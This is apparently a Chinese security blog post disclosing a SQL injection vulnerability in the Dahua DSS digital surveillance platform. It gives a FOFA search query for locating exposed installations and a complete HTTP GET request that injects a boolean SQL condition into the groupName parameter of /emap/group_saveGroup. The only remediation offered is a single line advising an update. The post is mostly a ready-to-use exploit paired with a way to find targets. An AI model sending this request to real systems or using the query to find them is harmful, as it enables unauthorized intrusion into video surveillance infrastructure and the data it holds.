#  [企业安全运维]大华-DDS数字监控系统-现新漏洞   
原创 合规渗透  合规渗透   2024-08-12 21:07  
  
**fofa语法：**  
  
app="dahua-DSS"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj61ewu1ukDvsxRNnJM3aIUNSS9kaYdnUGhmoEOJyvlXXg6VoJiblLkXodrHJVErk2aNWb47MgoZ7EQ/640?wx_fmt=png&from=appmsg "")  
  
**漏洞详情：**  
```
GET
/emap/group_saveGroup?groupName=1'%20and%202333=2333%20and%20'hami'='hami&groupDesc=1
HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1;
rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
```  
  
**修复方案：**  
  
更新系统至最新版本****  
  
